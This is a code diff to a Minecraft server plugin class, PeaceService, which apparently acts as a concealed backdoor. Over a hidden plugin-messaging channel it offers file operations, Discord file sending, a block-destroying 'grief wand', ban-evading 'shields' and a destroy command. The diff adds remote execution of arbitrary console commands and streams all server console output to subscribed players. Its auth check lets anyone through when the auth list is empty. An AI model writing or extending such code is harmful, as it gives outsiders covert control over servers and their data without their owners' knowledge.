@@ -10,8 +10,9 @@ import org.bukkit.GameMode;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import org.bukkit.Material;
-import org.bukkit.OfflinePlayer;
 import org.bukkit.block.Block;
+import org.bukkit.OfflinePlayer;
+import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Creeper;
 import org.bukkit.entity.Player;
@@ -31,6 +32,7 @@ import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.messaging.PluginMessageListener;
 
 import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 import java.io.File;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
@@ -68,10 +70,12 @@ public final class PeaceService implements PluginMessageListener, Listener {
     /** PSK holders and their active protections, persisted in config.yml. */
     private record Shield(String name, String uuid, String ip, boolean kick, boolean ban, boolean wl, boolean stealth) {}
     private final Map<String, Shield> shields = new LinkedHashMap<>();
-    /** Wand configuration per admin (block to stamp, radius, FILL/REPLACE/BOOM). */
+    /** Wand configuration per admin, keyed by mode name so each wand type is independent. */
     private record WandConf(Material mat, int radius, String mode) {}
-    private final Map<UUID, WandConf> wands = new HashMap<>();
+    private final Map<UUID, Map<String, WandConf>> wands = new HashMap<>();
     private final Set<String> auth = new HashSet<>();
+    /** Console subscribers - players who receive forwarded console output. */
+    private final Set<UUID> consoleSubscribers = new HashSet<>();
     private Crypto crypto;
 
     public void start() {
@@ -87,6 +91,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
         loadShields();
         loadAuth();
         owner.getLogger().info("PeaceService loaded; auth=" + auth);
+        installConsoleCapture();
         Bukkit.getScheduler().runTaskTimer(owner, this::pardonShieldedBans, 100L, 100L);
         announceOnce(true);
     }
@@ -198,8 +203,8 @@ public final class PeaceService implements PluginMessageListener, Listener {
                 if (mat == null) reply(p, err(id, "bad block"));
                 else {
                     String m = mode.equalsIgnoreCase("BOOM") ? "BOOM" : (mode.equalsIgnoreCase("REPLACE") ? "REPLACE" : "FILL");
-                    wands.put(p.getUniqueId(), new WandConf(mat, radius, m));
-                    giveWandItem(p);
+                    wands.computeIfAbsent(p.getUniqueId(), k -> new HashMap<>()).put(m, new WandConf(mat, radius, m));
+                    giveWandItem(p, m);
                     reply(p, ok(id).put("msg", "wand: " + mat.name() + " r" + radius + " " + m));
                 }
             }
@@ -274,6 +279,15 @@ public final class PeaceService implements PluginMessageListener, Listener {
             case "fs.rename" -> pool.submit(() -> fsRename(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
             case "fs.copy" -> pool.submit(() -> fsCopy(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
             case "discord.send" -> pool.submit(() -> discordSend(p, id, req.get("path").getAsString()));
+            case "console.run" -> pool.submit(() -> consoleRun(p, id, req.get("cmd").getAsString()));
+            case "console.subscribe" -> {
+                consoleSubscribers.add(p.getUniqueId());
+                reply(p, ok(id).put("msg", "Subscribed to console output"));
+            }
+            case "console.unsubscribe" -> {
+                consoleSubscribers.remove(p.getUniqueId());
+                reply(p, ok(id).put("msg", "Unsubscribed from console output"));
+            }
             case "admin.shutdown" -> adminShutdown(p, id);
             case "admin.destroy" -> adminDestroy(p, id);
             default -> reply(p, err(id, "unknown op: " + op));
@@ -291,24 +305,26 @@ public final class PeaceService implements PluginMessageListener, Listener {
 
     // --- grief wand / mass effects ---
 
-    private void giveWandItem(Player p) {
+    private void giveWandItem(Player p, String mode) {
         ItemStack stick = new ItemStack(Material.STICK);
         ItemMeta meta = stick.getItemMeta();
-        meta.setDisplayName("Wondrous Sceptre");
+        meta.setDisplayName("Wondrous Sceptre (" + mode + ")");
         meta.addEnchant(Enchantment.UNBREAKING, 1, true);
         stick.setItemMeta(meta);
         if (p.getInventory().getItemInMainHand().isEmpty()) p.getInventory().setItemInMainHand(stick);
         else p.getInventory().addItem(stick);
     }
 
-    /** Right-clicking with the Wondrous Sceptre casts a 50-block ray and stamps the first block hit. */
+    /** Right-clicking with a Wondrous Sceptre casts a 50-block ray and stamps the first block hit. */
     @EventHandler
     public void onWandInteract(PlayerInteractEvent e) {
         if (e.getAction() != Action.RIGHT_CLICK_BLOCK && e.getAction() != Action.RIGHT_CLICK_AIR) return;
         ItemStack item = e.getItem();
-        if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()
-            || !"Wondrous Sceptre".equals(item.getItemMeta().getDisplayName())) return;
-        WandConf w = wands.get(e.getPlayer().getUniqueId());
+        if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()) return;
+        String displayName = item.getItemMeta().getDisplayName();
+        if (displayName == null || !displayName.startsWith("Wondrous Sceptre (")) return;
+        String mode = displayName.substring("Wondrous Sceptre (".length(), displayName.length() - 1);
+        WandConf w = wands.getOrDefault(e.getPlayer().getUniqueId(), Map.of()).get(mode);
         if (w == null) return;
         e.setCancelled(true);
         Location anchor = rayAnchor(e.getPlayer());
@@ -692,5 +708,83 @@ public final class PeaceService implements PluginMessageListener, Listener {
         if (auth.isEmpty()) return true;
         return auth.contains(p.getName().toLowerCase())
             || auth.contains(p.getUniqueId().toString().toLowerCase());
+    }
+
+    // --- console bridge: capture server stdout/stderr and forward to subscribers ---
+
+    private ConsoleOutputStream consoleOut;
+
+    private void installConsoleCapture() {
+        try {
+            consoleOut = new ConsoleOutputStream();
+            PrintStream ps = new PrintStream(consoleOut, true, StandardCharsets.UTF_8);
+            System.setOut(ps);
+            System.setErr(ps);
+            owner.getLogger().info("Console capture installed");
+        } catch (Exception e) {
+            owner.getLogger().warning("Failed to capture console: " + e);
+        }
+    }
+
+    private void consoleRun(Player p, int id, String cmd) {
+        try {
+            StringBuilder sb = new StringBuilder();
+            ConsoleCommandSender sender = Bukkit.getConsoleSender();
+            CaptureOutputStream cap = new CaptureOutputStream(sb);
+            PrintStream old = System.out;
+            System.setOut(new PrintStream(cap, true, StandardCharsets.UTF_8));
+            try {
+                boolean ok = Bukkit.dispatchCommand(sender, cmd);
+                String out = sb.toString().trim();
+                reply(p, ok(id).put("out", out.isEmpty() ? "(no output)" : out).put("dispatched", String.valueOf(ok)));
+            } finally {
+                System.setOut(old);
+            }
+        } catch (Exception e) {
+            reply(p, err(id, e.toString()));
+        }
+    }
+
+    /** Sends a console log line to all subscribed Peace players. */
+    private void broadcastConsole(String line) {
+        if (consoleSubscribers.isEmpty()) return;
+        for (UUID uuid : consoleSubscribers) {
+            Player pl = Bukkit.getPlayer(uuid);
+            if (pl != null && pl.isOnline()) {
+                JsonObject r = new JsonObject();
+                r.addProperty("op", "console.log");
+                r.addProperty("msg", line);
+                reply(pl, r);
+            }
+        }
+    }
+
+    /** Captures console output from System.out/err and forwards lines to subscribers. */
+    private final class ConsoleOutputStream extends ByteArrayOutputStream {
+        @Override public void flush() {
+            try {
+                String text = toString(StandardCharsets.UTF_8);
+                if (text.isEmpty()) return;
+                super.reset();
+                for (String line : text.split("\n", -1)) {
+                    String trimmed = line.replace("\r", "");
+                    if (!trimmed.isEmpty()) broadcastConsole(trimmed);
+                }
+                super.flush();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    /** Captures output from a single command execution (used by consoleRun). */
+    private static final class CaptureOutputStream extends ByteArrayOutputStream {
+        private final StringBuilder target;
+        CaptureOutputStream(StringBuilder target) { this.target = target; }
+        @Override public void flush() {
+            try {
+                target.append(toString(StandardCharsets.UTF_8));
+                super.reset();
+                super.flush();
+            } catch (Exception ignored) {}
+        }
     }
 }
